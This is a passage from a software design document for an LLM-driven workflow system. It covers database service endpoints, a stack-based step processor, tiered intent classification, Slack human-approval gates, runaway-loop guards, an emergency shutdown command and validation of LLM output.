| 5 | PGC_Workflow | `domain`, `max_execution_ms`, `max_steps_per_window`, `window_seconds` added |
| 6 | PGC_WorkflowRun | `trace_id`, `triggered_by`, `state`, `total_execution_ms`, `step_count`, `steps_in_window`, `window_started_at` added |
| 7 | PGC_WorkflowRunStep | `capability_key`, `retry_count` added |
| 8 | PGC_Prompt | `input_variables`, `output_schema`, `output_sample`, `error_log` added |
| 9 | PGC_IntentMap | unchanged |
| 10 | PGC_WorkflowRunLock | unchanged |
| 11 | PGC_SystemContext | new |
| 12 | PGC_StepType | new |
| 13 | PGC_Capability | new |
| — | PGC_WorkflowStats | SQL view — not a physical table |

**Total: 13 physical PGC tables + 1 view**


---

## 5. Service Layer — SERV

### 5.1 SERV-Schema (complete)
DDL executor and PGC metadata registry.

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/serv/schema/createTable` | POST | Execute DDL + register in PGC_Schema + PGC_TableMap |
| `/api/v1/serv/schema/listTables` | POST | List entries from PGC_Schema, optional target filter |
| `/api/v1/serv/schema/getTable` | POST | Get one entry by tableName |
| `/api/v1/serv/schema/updateTable` | POST | Update metadata in PGC_Schema (NOT ALTER TABLE) |
| `/api/v1/serv/schema/deleteTable` | POST | DROP TABLE + remove from PGC_Schema + PGC_TableMap |

Security gate on `createTable`:
- Column types validated against whitelist (serial, text, integer, jsonb, timestamptz, etc.)
- Table names must match `^(PGC|PGD)_[A-Za-z][A-Za-z0-9_]*$`
- Protected system tables (`PGC_Schema`, `PGC_TableMap`, `PGC_EntitySchema`, `PGC_DomainHelp`) cannot be dropped

### 5.2 SERV-Table (complete)
DML executor gated by `PGC_TableMap`. All four operations live.

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/serv/table/getRows` | POST | Parameterised SELECT — filters, orderBy, limit |
| `/api/v1/serv/table/insertRow` | POST | Single INSERT RETURNING * — gated by `allow_insert` |
| `/api/v1/serv/table/updateRows` | POST | Parameterised UPDATE RETURNING * — gated by `allow_update` |
| `/api/v1/serv/table/deleteRows` | POST | Parameterised DELETE — gated by `allow_delete` |

Security gate on all operations:
- Table must be registered in `PGC_TableMap`
- Column names validated against `PGC_Schema.columns` for that table
- Filter operators validated against whitelist (`eq`, `neq`, `gt`, `gte`, `lt`, `lte`, `like`, `in`, `is_null`, `not_null`)
- `updateRows` and `deleteRows` require non-empty `filters` — unfiltered mass writes rejected at 400
- `allow_insert`, `allow_update`, `allow_delete` checked per-table from `PGC_TableMap`

**PGC_TableMap defaults:**
- PGC system tables: `allow_insert` varies, `allow_update: true`, `allow_delete: false`
- PGD domain tables: `allow_insert: true`, `allow_update: true`, `allow_delete: true`

`SERV-Table` is used by PROC for all **system config** operations (e.g. `PGC_WorkflowRun`, `PGC_Prompt`).
User domain data operations go through `SERV-Entity` instead.

### 5.3 SERV-Entity (complete)
User-facing domain data layer. Callers use entity names (`Recipe`, `Stock`) — never table names.
`PGC_EntitySchema` defines the `root_table`, `joins`, `aggregations`, `upsert_key`, and default `filters` for each entity.
Used by PROC when executing workflow steps that read or write user domain data.

| Endpoint | Method | Description |
|---|---|---|
| `/api/v1/serv/entity/getEntity` | POST | Fetch one entity by id — with configured joins and jsonb_agg aggregations |
| `/api/v1/serv/entity/listEntities` | POST | List entities — filters, orderBy, limit — entity default filters always applied |
| `/api/v1/serv/entity/createEntity` | POST | INSERT root row — system cols (id, created_at, updated_at) stripped automatically |
| `/api/v1/serv/entity/updateEntity` | POST | UPDATE root row — `patch` (default) or `replace` mode — children unaffected |
| `/api/v1/serv/entity/upsertEntity` | POST | INSERT ... ON CONFLICT DO UPDATE — requires `upsert_key` defined in PGC_EntitySchema |
| `/api/v1/serv/entity/deleteEntity` | POST | DELETE root row — CASCADE handles children via FK — gated by `allow_delete` |

**Design decisions:**
- Entity operations only touch the root table. Child rows (e.g. `RecipeIngredient`) are managed
  via their own `createEntity` / `deleteEntity` calls with the parent `id` provided explicitly.
- `updateEntity patch` — sets only provided fields, leaves all others unchanged.
- `updateEntity replace` — sets ALL non-system fields from provided data, resetting omitted fields to null.
  Use when replacing an entire entity (e.g. new recipe version) while preserving `id` and child FK relationships.
- `upsertEntity` uses `xmax = 0` to detect true INSERT vs UPDATE without a second DB round-trip.
  `wasInserted: true/false` returned in response.
- `upsert_key` must correspond to an existing `UNIQUE` constraint on the physical root table.
  `/create-domain` is responsible for setting both the DDL constraint and the `upsert_key` together.

**Tier separation:**
- `SERV/table` — system config operations on PGC tables. Used by PROC for workflow state, prompts, etc.
- `SERV/entity` — user domain data operations on PGD tables. Used by PROC for workflow step execution.

### 5.4 SERV services — not yet built
- **SERV-Query** — cross-entity parameterised SELECT with pagination (Phase 3)

---

## 6. Process Layer — PROC

### 6.1 Callback / Notification Abstraction — IMPLEMENTED

All SQS message payloads use `callback: { provider, channel, threadId }`.
`routeCallback()` in `callback.mjs` dispatches on `provider` — adding a new UI is one new `case`.
SERV is UI-agnostic — callback fields are never read in the SERV layer.

---

### 6.2 Step Definition Schema

Every workflow step in `PGC_Workflow.steps` follows this schema:

```json
{
  "step":         1,
  "type":         "serv_query | serv_insert | serv_update | serv_delete | serv_schema | llm_call | sub_workflow | condition | human_gate | js_transform | notify | end",
  "description":  "Human readable description",
  "input":        {},
  "output_key":   "key_in_local_state",
  "on_success":   "next | end | step:N",
  "on_failure":   "human_feedback | retry | pop | cancel",
  "on_condition": { "if_true": "next | step:N", "if_false": "next | step:N" },
  "confirmation_message": null
}
```

### `output_key` — step state hashmap

`output_key` is a string key into the frame's `local_state` hashmap. When a step
completes, the Step Processor stores the step's result at `local_state[output_key]`.
Subsequent steps read from it using `{{output_key}}` or `{{output_key.field}}`
template syntax in their `input`, `message_template`, and `context_key` fields.

```
Step 1 executes → local_state['proposed_scaffold'] = { domain, tables, domainHelp }
Step 2 message_template: "Plan for *{{proposed_scaffold.domain}}*"  → resolved at runtime
Step 5 items_key: "proposed_scaffold.tables"                        → iterator seeds from it
Step 7 input: "{{item}}"                                            → each table from iterator
```

`local_state` is a plain JSON object on the frame — a hashmap scoped to the current
workflow frame. Sub-workflow frames have their own `local_state`. When a sub-workflow
pops, its output can be written back to the parent frame's `local_state` via the
sub-workflow's own `output_key`.

### Step types

```
| Type | Description | Executes |
|---|---|---|
| `serv_query` | SELECT from PGD table | ServFunction direct invoke |
| `serv_insert` | INSERT into PGD table | ServFunction direct invoke |
| `serv_update` | UPDATE PGD table | ServFunction direct invoke |
| `serv_delete` | DELETE from PGD table | ServFunction direct invoke |
| `serv_schema` | Create/alter table | ServFunction direct invoke |
| `llm_call` | Call LLM with prompt from PGC_Prompt | LLM provider |
| `sub_workflow` | Execute child workflow | Push new frame onto stack |
| `condition` | Evaluate expression, branch | In-process JS expression evaluator |
| `human_gate` | Pause for user confirmation | Slack interactive message, suspend stack |
| `js_transform` | Run sandboxed JS (Option C) | In-process sandbox with security gate |
| `notify` | Post message to UI | SQS SlackResults → CallbackListener |
| `end` | Terminate workflow cleanly | — |
```


### 6.3 Execution Stack — Frame Schema

`PGC_WorkflowRun.stack` is a JSON array. The Step Processor always executes the **top frame** (last element).

```json
{
  "frame_id":               "uuid",
  "type":                   "workflow | iterator | human_gate | js_transform",
  "status":                 "running | awaiting | completed | failed",
  "workflow_name":          "string (workflow frames only)",
  "current_step":           1,
  "items":                  [],
  "current_index":          0,
  "execution_mode":         "sequential",
  "parallel_group_id":      null,
  "parallel_error_strategy": "abort_all",
  "local_state":            {},
  "on_complete":            "next | pop | pop_to:frameId",
  "on_error":               "human_feedback | retry | pop | cancel",
  "pushed_at":              "ISO timestamp"
}
```

### Stack operations

| Operation | When | Effect |
|---|---|---|
| PUSH workflow frame | Enter sub-workflow | New frame on top, parent paused |
| PUSH iterator frame | Start iterating a list | New iterator frame on top |
| PUSH human_gate frame | Destructive op or user confirmation needed | Suspend stack, post Slack interactive message |
| POP frame | Frame completes | Remove top, return output to parent |
| POP to frame_id | User cancels at human gate | Unwind stack to target frame |

### Sequential iterator rule
**The iterator NEVER enqueues all items simultaneously.** It pushes one item frame, waits for it to pop, then pushes the next. At all times there is exactly one SQS message in flight per `workflowRunId`. This is enforced by stack discipline, not by FIFO queues or locking.

### SQS message format
```json
{
  "type":          "WORKFLOW_STEP",
  "workflowRunId": 42,
  "action":        "execute_top | resume_gate | cancel",
  "traceId":       "uuid"
}
```

Note: `traceId` is a plain UUID today. W3C `traceparent` format
(`{version}-{traceId}-{parentId}-{flags}`) is deferred to when observability
tooling is added. See tech debt register.

### Idempotency
Before executing any step, the Step Processor checks `PGC_WorkflowRunStep` for a row with the same `run_id`, `frame_id`, and `step_number`. If found, the step already ran (SQS redelivery) — skip execution, enqueue next message based on existing stack state.

---

### 6.4 Intent Preprocessor

### Design principles
- Coded logic always runs first — cheap, fast, no LLM cost
- LLM only invoked when coded logic cannot classify the intent
- Every classified intent resolves to a `PGC_Workflow` row and is handed to the Step Processor
- Novel intents that require new workflows or domains are `heavy_lift` — use powerful LLM

### Three-tier classification pipeline

```
User input (natural language)
  │
  ▼
Tier 1 — Coded exact match (zero cost)
  ├── Exact match in PGC_IntentMap.pattern    → load PGC_Workflow → Step Processor
  ├── Alias match in PGC_DomainHelp.aliases   → load PGC_Workflow → Step Processor
  └── Simple CRUD pattern (regex coded logic) → build ad-hoc step → Step Processor
         e.g. "list recipes", "add recipe X", "delete ingredient Y"
  │
  ▼ (no match)
Tier 2 — Cheap LLM classification (Claude Haiku / GPT-4o-mini)
  Prompt: "Classify this intent. Return JSON: { intent_category, workflow_name, action_type }"
  ├── workflow_name found in PGC_Workflow      → load workflow → Step Processor
  ├── action_type = 'crud'                    → build ad-hoc CRUD step → Step Processor
  └── action_type = 'heavy_lift'              → Tier 3
  │
  ▼
Tier 3 — Heavy lift LLM (Claude Sonnet/Opus)
  ├── intent_category = 'create_domain'       → create_domain workflow → Step Processor
  └── intent_category = 'create_workflow'     → design + store new PGC_Workflow → Step Processor
```

### PGC_IntentMap bootstrap rows (seeded at init-brain bootstrap)

| pattern | intent_category | workflow_id | action_type |
|---|---|---|---|
| `create.domain\|new.domain\|build.domain` | `create_domain` | → create_domain workflow | `heavy_lift` |
| `create.workflow\|new.workflow` | `create_workflow` | → create_workflow workflow | `heavy_lift` |
| `list.domains\|show.domains` | `list_domains` | → list_domains workflow | `crud` |
| `help` | `help` | → help workflow | `crud` |

### CRUD pattern detection (coded logic — no LLM)

Patterns detected without any LLM call:
```
list <domain>           → serv_query on root table of domain
add <domain> <name>     → serv_insert into root table
update <domain> <id>    → serv_update on root table
delete <domain> <id>    → serv_delete + human confirm gate
show <domain> <id>      → serv_query with filter
```
Domain is resolved via `PGC_DomainHelp.aliases` match.

### Intent Preprocessor HTTP endpoint

```
POST /proc/classify-intent
Body: { userInput, traceId }
Response: {
  intent_category,
  action_type,        // 'crud' | 'workflow' | 'heavy_lift'
  workflow_id,        // PGC_Workflow.id if found
  ad_hoc_step,        // step definition if CRUD pattern matched
  confidence,         // 'exact' | 'alias' | 'llm_classified' | 'heavy_lift'
  traceId
}
```

Called by `ProcFunction` SQS handler after receiving a `CLASSIFY_INTENT` message,
or directly via curl for testing intent classification without SQS.

### LLM model selection

| Task | Model | Reason |
|---|---|---|
| Intent classification | `perplexity/sonar` or Claude Haiku | Fast, cheap, structured JSON |
| Simple workflow generation | `anthropic/claude-sonnet-4-5` | Good reasoning, moderate cost |
| Complex domain/schema generation | `anthropic/claude-sonnet-4-5` | Best JSON output, reliable |
| Prompt improvement | `anthropic/claude-sonnet-4-5` | Good at meta-reasoning |
| Error analysis | `anthropic/claude-sonnet-4-5` | Good at debugging |

Model selection is coded logic based on task category, stored in `PGC_Prompt.model`.

---

### 6.5 Workflow as Code — Hybrid Approach

Decision: Declarative JSON steps for common operations, sandboxed JS only for complex transformations.

- 95% of workflows: declarative step types (`serv_query`, `serv_update`, `notify`, etc.)
- Complex transformations: `js_transform` step with security gate before `new Function()` execution
- Security gate for `js_transform`: static analysis, AST inspection, whitelist of allowed operations
- All JS workflows stored in `PGC_Workflow.js_extensions` — never executed without gate check

---

### 6.6 Human-in-the-Loop — General Pattern

Any workflow step can declare itself as requiring human input before or after
execution. The system suspends the stack at a `human_gate` frame, presents
context to the user via the experience layer, waits for a response, then
resumes or branches accordingly.

### General `human_gate` step schema

```json
{
  "type":             "human_gate",
  "gate_type":        "confirm | select_one | select_many | edit_list | text_input | review_object",
  "message_template": "Plain text with {{variable}} substitution from local_state. No markup, no emoji.",
  "context_key":      "dot-path into local_state — data source for the dialog",
  "item_primary_key": "field name on each item to use as primary label (edit_list, select_one, select_many)",
  "item_secondary_key": "field name on each item to use as secondary text — must be a real field, derived by a preceding js_transform step if needed",
  "item_action": {
    "condition":       "boolean expression per item — items where false get no action button",
    "action":          "userResponse value sent on click",
    "action_data_key": "field on the item that becomes responseData",
    "confirm_template": "optional confirmation prompt, resolved per item"
  },
  "options": [
    { "label": "Confirm",  "action": "confirm",  "on_select": "next"   },
    { "label": "Cancel",   "action": "cancel",   "on_select": "cancel" }
  ],
  "on_timeout":       "cancel",
  "timeout_seconds":  3600
}
```

`options` labels are plain text — no emoji, no markup. The renderer adds all
formatting. `action` values are the primitive `userResponse` strings the Step
Processor receives.

When a `human_gate` step is reached:
1. Step Processor pushes a `human_gate` frame onto the stack
2. Sets `PGC_WorkflowRun.status = 'awaiting_human_gate'`
3. Builds a concrete `WORKFLOW_GATE` dialog from `gate_type` + binding metadata + resolved `local_state` data
4. Enqueues `WORKFLOW_GATE` to `SYSSQSCallbackResults`
5. SQS message processing completes — stack suspended, no timeout on Lambda
6. User responds → Slack sends to `/interactive` endpoint on SlackbotFunction
7. SlackbotFunction enqueues `{ type: 'WORKFLOW_STEP', action: 'resume_gate', response: '...' }`
8. Step Processor resumes — pops gate frame, routes based on user response

### Gate type catalogue

Six primitive types — UI-agnostic, independent of any workflow domain.
The Step Processor has one `buildDialog()` handler per type.

| gate_type | Interaction | Dialog fields produced |
|---|---|---|
| `confirm` | Read a proposal, accept or reject | `typography` + `actions` |
| `select_one` | Pick exactly one item | `typography` + `radio` or `select` + `actions` |
| `select_many` | Pick zero or more items | `typography` + `checkbox` + `actions` |
| `edit_list` | View a collection, optionally remove items, confirm | `typography` + `list` with per-row actions + `actions` |
| `text_input` | Provide free text | `typography` + `textbox` + `actions` |
| `review_object` | Review a structured summary, accept or reject | `typography` + structured summary + `actions` |

System gate types (not user-dialog):

| gate_type | When triggered | User sees |
|---|---|---|
| `error_recovery` | Step execution failed | Error details + fix/skip/cancel options |
| `execution_limit` | Execution accumulator tripped | Elapsed time + cost + continue/stop options |
| `velocity_limit` | Velocity detector tripped | Step count + last step + show/delete/dismiss options |

### Gate instances

**Destructive operation gate** (`confirm`)
```
You are about to drop table PGD_Recipes and all its data. This cannot be undone.
[Confirm]  [Cancel]
```

**Error recovery gate** (`error_recovery`)
```
Step 3 of "deduct_inventory" failed.
Error: Column "quantity" not found in PGD_Inventory.

[Fix the schema]  [Fix the data]  [Skip step]  [Cancel]
```
Stack operations: Fix → push sub-workflow frame. Skip → pop failed frame, advance. Cancel → cancel.

**Domain review gates** — see Section 6.8 and Section 6.11 for full create-domain workflow.

---

### 6.7 Parallel Execution — Deferred, Hooks Only

Decision: Implement sequentially now. Parallel is a future nice-to-have.

### Hooks baked into frame schema (fields present, ignored by sequential processor)
- `execution_mode` on iterator frames — today always `"sequential"`
- `parallel_group_id` on workflow frames — today always `null`
- `parallel_error_strategy` on iterator frames — today ignored
- `PGC_WorkflowRunLock` table — bootstrapped empty, not used

### When parallel is implemented
- `execution_mode: "parallel"` on iterator frames triggers fan-out
- `parallel_group_id` UUID groups sibling frames
- Fan-in watches for all group frames to reach `completed`
- Optimistic locking via `PGC_WorkflowRunLock.version` prevents race conditions on stack writes

### 6.8 create_domain Workflow — Full Definition

#### Overview
`create_domain` is the first declarative workflow stored in `PGC_Workflow`.
It demonstrates the full capability of the Step Processor — LLM calls, multi-step
human review gates, iterators, sub-workflows, and service calls — all driven by
the declarative step schema in Section 6.2.

The current `handleCreateDomain` hardcoded implementation is a placeholder.
Once the Step Processor is built, `create_domain` becomes a `PGC_Workflow` row
executed generically — no special-case code in PROC.

#### Bootstrap seeds required (in `init-brain.mjs`)

**`PGC_Prompt` rows:**
- `intent_category: 'create_domain'` — schema design prompt (version 2 already seeded manually)
- `intent_category: 'design_table'` — designs fields for a single new table when user adds one
- `intent_category: 'merge_tables'` — redesigns a merged table from two inputs

**`PGC_Workflow` row:** `name: 'create_domain'`

**`PGC_IntentMap` row:** pattern `create.domain|new.domain`, workflow_id → create_domain

#### Declarative step definitions

Note: all `step` keys are strings. All `message_template` and `option.label`
values are plain text — no emoji, no markup. The renderer adds all formatting.
`gate_type` values are primitive UI types from the catalogue in Section 6.6.

Step 2 (`js_transform`) is the canonical example of the **data preparation
pattern**: the LLM scaffold produces `columns` as a raw array of objects.
The `edit_list` gate needs a `columnSummary` string per table (e.g.
`"name, description, prep_time_minutes"`). Rather than coupling `buildDialog()`
to domain-specific field derivation, a `js_transform` step enriches
`proposed_scaffold.tables` with a `columnSummary` field before the gate runs.
`buildDialog()` then does a plain field lookup: `item["columnSummary"]`.
This pattern applies generally — any `human_gate` that needs derived display
fields must be preceded by a `js_transform` that adds them to `local_state`.

```json
[
  {
    "step": "1",
    "type": "llm_call",
    "description": "LLM designs full domain schema. Must produce one primary table (no FK references) and zero or more child tables referencing it.",
    "input": { "prompt": "create_domain", "user_input": "{{input.userInput}}" },
    "output_key": "proposed_scaffold",
    "on_success": "next",
    "on_failure": "human_feedback"
  },
  {
    "step": "2",
    "type": "js_transform",
    "description": "Enrich each table in proposed_scaffold.tables with a columnSummary string — first 4 non-system column names joined with ', '. Required by the edit_list gate at step 3.",
    "input_key": "proposed_scaffold.tables",
    "output_key": "proposed_scaffold.tables",
    "on_success": "next",
    "on_failure": "human_feedback"
  },
  {
    "step": "3",
    "type": "human_gate",
    "gate_type": "edit_list",
    "description": "User reviews proposed table list. Child tables (FK references > 0) may be removed. Primary table cannot be removed.",
    "message_template": "Here's my plan for domain {{proposed_scaffold.domain}}. You can remove any child tables you don't need.",
    "context_key": "proposed_scaffold.tables",
    "item_primary_key": "tableName",
    "item_secondary_key": "columnSummary",
    "item_action": {
      "condition": "item.foreignKeys.length > 0",
      "action": "remove_item",
      "action_data_key": "tableName",
      "confirm_template": "Remove {{item.tableName}} from this domain?"
    },
    "options": [
      { "label": "Looks good", "action": "confirm", "on_select": "next"   },
      { "label": "Cancel",     "action": "cancel",  "on_select": "cancel" }
    ],
    "on_success": "next",
    "on_failure": "cancel"
  },
  {
    "step": "4",
    "type": "human_gate",
    "gate_type": "confirm",
    "description": "Final confirmation before DDL execution.",
    "message_template": "Ready to create domain {{proposed_scaffold.domain}} with {{proposed_scaffold.tables.length}} tables. This will create the physical database tables.",
    "options": [
      { "label": "Create it", "action": "confirm", "on_select": "next"   },
      { "label": "Cancel",    "action": "cancel",  "on_select": "cancel" }
    ],
    "on_success": "next",
    "on_failure": "cancel"
  },
  {
    "step": "5",
    "type": "iterator",
    "description": "Create each confirmed PGD table via SERV-Schema createTable.",
    "items_key": "proposed_scaffold.tables",
    "item_step": {
      "type": "serv_schema",
      "input": "{{item}}",
      "on_failure": "human_feedback"
    },
    "execution_mode": "sequential",
    "output_key": "created_tables",
    "on_complete": "next",
    "on_failure": "human_feedback"
  },
  {
    "step": "6",
    "type": "serv_insert",
    "description": "Register domain aliases and help text in PGC_DomainHelp.",
    "input": { "tableName": "PGC_DomainHelp", "row": "{{proposed_scaffold.domainHelp}}" },
    "on_success": "next",
    "on_failure": "human_feedback"
  },
  {
    "step": "7",
    "type": "notify",
    "description": "Confirm domain creation to user.",
    "message_template": "Domain {{proposed_scaffold.domain}} is ready. {{created_tables_summary}}",
    "on_success": "end"
  },
  {
    "step": "8",
    "type": "end"
  }
]
```

#### Local state shape during execution

```json
{
  "input": { "userInput": "stock portfolio with price history" },
  "proposed_scaffold": {
    "domain": "stock_portfolio",
    "tables": [...],
    "domainHelp": {...},
    "table_summary": "• PGD_Companies\n• PGD_StockPriceHistory\n..."
  },
  "created_tables": [...],
  "created_tables_summary": "• `PGD_Companies` — created ✅\n..."
}
```




### 6.9 Workflow Safety — Circuit Breakers and Emergency Shutdown

Workflows generated by the LLM may contain logic errors causing infinite loops or
runaway execution. The system protects against this at two levels: static analysis
at workflow creation time, and runtime monitoring during execution.

Legitimate long-running workflows (e.g. analysing 300 stocks) must not be blocked
by overly restrictive limits. Guards are designed to detect abnormal behaviour
patterns, not constrain valid workloads.

#### Guard 1 — Velocity detector (runtime, kills run)

Detects tight routing loops — the signature of a buggy LLM-generated step graph.

**Trigger:** More than `max_steps_per_window` steps execute within `window_seconds`
with no `human_gate` step in between.

**Rationale:** A legitimate 300-stock analysis has natural pacing — each stock takes
real time. A loop executes as fast as SQS + Lambda allows — dozens of steps per second.
A human gate anywhere in the window resets the counter (human interaction = not a loop).

**How the check runs:**
Before enqueuing the next SQS step message, the Step Processor evaluates:
```
elapsed = now - PGC_WorkflowRun.window_started_at
if elapsed <= window_seconds AND steps_in_window >= max_steps_per_window:
    → KILL: set status = 'failed', post Slack alert, discard SQS message
if a human_gate step just completed:
    → RESET: steps_in_window = 0, window_started_at = now
else:
    → INCREMENT: steps_in_window += 1 (same UPDATE as stack write — no extra round-trip)
```

Both `steps_in_window` and `window_started_at` live on `PGC_WorkflowRun` (see schema
additions below). All reads and writes happen in the same DB transaction as the stack
update — no extra round-trip.

**Action:** Kill immediately. Set `PGC_WorkflowRun.status = 'failed'`. Post to Slack:

```
⚠️ Workflow *{{workflow_name}}* was stopped — possible infinite loop detected.

{{steps_in_window}} steps executed in {{elapsed}}s with no human interaction.
Last step: {{last_step_description}}

[🔍 Show workflow definition]  [🗑️ Delete this workflow]  [❌ Dismiss]
```

**Thresholds:** `max_steps_per_window` and `window_seconds` are stored per workflow in
`PGC_Workflow` — allowing stricter limits on LLM-generated workflows and looser limits
on trusted system workflows. System-wide defaults (`max_steps_per_window: 20`,
`window_seconds: 10`) are stored in `PGC_SystemContext` under key `guardrail_defaults`
and applied when a workflow row has NULL for these columns.

#### Guard 2 — Execution accumulator (runtime, pauses run)

Monitors total Lambda execution time across all steps of a run.
Designed to handle legitimately long workflows — pauses rather than kills.

**Trigger:** `PGC_WorkflowRun.total_execution_ms` exceeds `PGC_Workflow.max_execution_ms`.

**How the check runs:**
Every step writes a `PGC_WorkflowRunStep` row with `duration_ms`.
The Step Processor adds that value to `PGC_WorkflowRun.total_execution_ms` in the
same UPDATE as the stack write — no extra DB round-trip. The check runs after that
UPDATE, before enqueuing the next step message:

```
total_execution_ms += duration_ms   ← same UPDATE as stack write
step_count += 1                     ← same UPDATE
if max_execution_ms IS NOT NULL AND total_execution_ms >= max_execution_ms:
    → PAUSE: set status = 'awaiting_human_gate', push human_gate frame, post Slack alert
```

**Action:** Suspend at next step boundary. Set status to `awaiting_human_gate`. Post to Slack:

```
⏸️ Workflow *{{workflow_name}}* has been running for {{elapsed_minutes}} minutes.
Steps completed: {{step_count}} | Estimated cost: ~${{estimated_cost}}

Still going?
[▶️ Continue for another {{extension_minutes}} min]  [⏹️ Stop now]  [🔕 Disable timer for this run]
```

User options:
- **Continue** → extends `max_execution_ms` by a configurable increment, resumes
- **Stop now** → sets status to `cancelled`, posts confirmation
- **Disable timer** → sets `max_execution_ms = NULL` for this run, resumes without limit

**Thresholds:** `max_execution_ms` is stored per workflow in `PGC_Workflow`.
System-wide default (`max_execution_ms: 300000` — 5 minutes) and
`extension_minutes: 5` are stored in `PGC_SystemContext` under key `guardrail_defaults`.
Cost estimate uses the usage data already returned by the Perplexity Agent API response.

#### Guard 3 — Cycle detector (static, rejects workflow at store time)

Validates the step graph for structural cycles before a workflow is stored in `PGC_Workflow`.
Runs once at creation — zero runtime cost.

**How it works:** Traverse all `on_success`, `on_failure`, `on_select` routing values.
Build a directed graph of step → step edges. Run DFS cycle detection.
If a cycle is found, reject the `INSERT` into `PGC_Workflow` with a descriptive error.

**Limitation:** Cannot catch dynamic routing loops (where routing depends on runtime
`local_state` values). Those are caught by Guard 1 at runtime.

**Action:** Reject workflow storage. Log the cycle path. Increment `PGC_Prompt.error_log`
for the prompt that generated this workflow — feeds prompt improvement loop.

#### `/shutdown` — Emergency stop (user-initiated, immediate)

Allows the user to immediately cancel all active workflows or a specific run.
Use case: user fears a misworded command is causing harm and wants to stop everything.

**Slack commands:**
```
/shutdown                 — cancel ALL active workflow runs for this instance
/shutdown <runId>         — cancel a specific run by PGC_WorkflowRun.id
```

**Flow:**
1. Slack → SlackbotFunction → synchronous response (no SQS hop — must be immediate)
2. SlackbotFunction calls `ProcFunction POST /proc/shutdown` directly via HTTP
3. ProcFunction sets `PGC_WorkflowRun.status = 'cancelled'` for matching runs
4. ProcFunction enqueues `{ type: 'WORKFLOW_STEP', action: 'cancel', workflowRunId }`
   to SQS WorkflowQueue for each cancelled run
5. Step Processor discards any in-flight message for cancelled runs on next execution
6. SlackbotFunction posts immediate confirmation to Slack:
```
🛑 Shutdown complete.

Cancelled {{count}} active workflow(s):
{{#each cancelled}}
• *{{workflow_name}}* — stopped at step {{current_step}} (was: {{status}})
{{/each}}
```
Any in-flight steps will be discarded on next execution.

If no active workflows exist:
```
✅ No active workflows to cancel.
```

**Step Processor cancellation check:**
Before executing any step, the Step Processor reads `PGC_WorkflowRun.status`.
If `cancelled` → discard SQS message (return success to avoid retry), do not execute.
This check already exists for idempotency — cancellation reuses the same path.

#### Schema fields added for guardrails

**`PGC_WorkflowRun` — new columns (safety state, updated in same transaction as stack write):**

| Column | Type | Notes |
|---|---|---|
| `total_execution_ms` | integer | Running sum of all step `duration_ms` values. Used by Guard 2 |
| `step_count` | integer | Total steps executed this run — incremented on every step |
| `steps_in_window` | integer | Steps since last `human_gate` step — reset when a gate completes. Used by Guard 1 |
| `window_started_at` | timestamptz | When the current velocity window started — reset with `steps_in_window`. Used by Guard 1 |

**`PGC_Workflow` — new columns (per-workflow thresholds, NULL = use system defaults from PGC_SystemContext):**

| Column | Type | Notes |
|---|---|---|
| `max_execution_ms` | integer | Guard 2 ceiling. NULL = use system default (300000) |
| `max_steps_per_window` | integer | Guard 1 threshold. NULL = use system default (20) |
| `window_seconds` | integer | Guard 1 window duration. NULL = use system default (10) |

**`PGC_SystemContext` — seed row for guardrail defaults:**

| key | section | content |
|---|---|---|
| `guardrail_defaults` | `rules` | `{ "max_steps_per_window": 20, "window_seconds": 10, "max_execution_ms": 300000, "extension_minutes": 5 }` |

#### PGC_WorkflowStats — SQL view for LLM prompt injection

This view is **not used by the guards**. Guards 1 and 2 operate on per-run columns in
`PGC_WorkflowRun` updated in-transaction with the stack write. No view query is needed
on the hot execution path.

`PGC_WorkflowStats` is queried **only by PROC when building prompts** for workflow
evaluation or improvement — it gives the LLM cross-run context (how often does this
workflow fail?) without storing redundant counters on the definition table.

```sql
CREATE OR REPLACE VIEW "PGC_WorkflowStats" AS
SELECT
  workflow_id,
  COUNT(*)                                             AS run_count,
  COUNT(*) FILTER (WHERE status = 'failed')            AS failure_count,
  COUNT(*) FILTER (WHERE status = 'completed')         AS success_count,
  COUNT(*) FILTER (WHERE status = 'cancelled')         AS cancelled_count,
  ROUND(
    COUNT(*) FILTER (WHERE status = 'failed')::numeric
    / NULLIF(COUNT(*), 0) * 100, 1
  )                                                    AS failure_rate_pct,
  MAX(created_at)                                      AS last_run_at,
  (ARRAY_AGG(status ORDER BY created_at DESC))[1]      AS last_status,
  AVG(total_execution_ms)
    FILTER (WHERE status = 'completed')                AS avg_execution_ms
FROM "PGC_WorkflowRun"
GROUP BY workflow_id;
```

Registered in `PGC_TableMap.views` on the `PGC_WorkflowRun` row — consistent with the
existing `views` jsonb pattern. Not a physical table. No bootstrap DDL required beyond
the `CREATE VIEW` statement in `init-brain.mjs`.

---

---

### 6.10 Right-Brain Output Validation — Repeat-Until-Correct Loop

Every `llm_call` and `js_transform` step produces output that must be validated before
being passed to the next step. Without validation, structurally invalid output propagates
silently into DDL, SQS payloads, or workflow state — causing failures downstream with no
recoverable context. This section defines the validation and correction loop that runs
after every LLM output is received, before any downstream action executes.

#### Design principles

- Validation is always **in-process** — no extra Lambda invocation, no external call
- Maximum **2 LLM attempts** per step execution — never an unbounded loop
- All failures are written to `PGC_Prompt.error_log` — structured, queryable, permanent
- The correction prompt injects the **exact Ajv or runtime error** from attempt 1 — not a vague retry
- SQS retries are **not** the correction mechanism — they are for transient infrastructure failures only

#### JSON Schema validation — Ajv

Used for all `llm_call` steps that return structured JSON (e.g. `create_domain`, `merge_tables`).

The validator is **Ajv** (Another JSON Validator) — the Node.js standard for JSON Schema validation,
equivalent to XSD for XML. The schema lives in `PGC_Prompt.output_schema` and is fetched alongside
the prompt. No hardcoded rules — the schema is the contract, and it evolves with the prompt.

**Validation loop:**

```
attempt 1
  LLM call → parse JSON → Ajv.validate(output_schema, scaffold)
  if valid   → pass scaffold to next step
  if invalid → log errors to PGC_Prompt.error_log
             → inject Ajv error array into correction prompt
             → attempt 2: LLM call with error context

attempt 2
  LLM call → parse JSON → Ajv.validate(output_schema, scaffold)
  if valid   → pass scaffold to next step
  if invalid → write full error record to PGC_Prompt.error_log
             → set WorkflowRun status = 'failed'
             → post error_recovery human_gate to Slack
             → halt — do not proceed to DDL or next step
```

**Correction prompt injection (attempt 2):**

```
Your previous response had these validation errors:
{{ajv_errors_as_json}}

Return the corrected JSON only. Do not change any fields that were not flagged.
```

**Error log entry shape** (written on any validation failure):

```json
{
  "at": "ISO timestamp",
  "error_type": "json_schema_validation",
  "error_message": "Ajv error summary",
  "ajv_errors": [ ...full Ajv error array... ],
  "llm_raw_output": "raw text before parse",
  "recovery_action": "injected_errors_retry | halt"
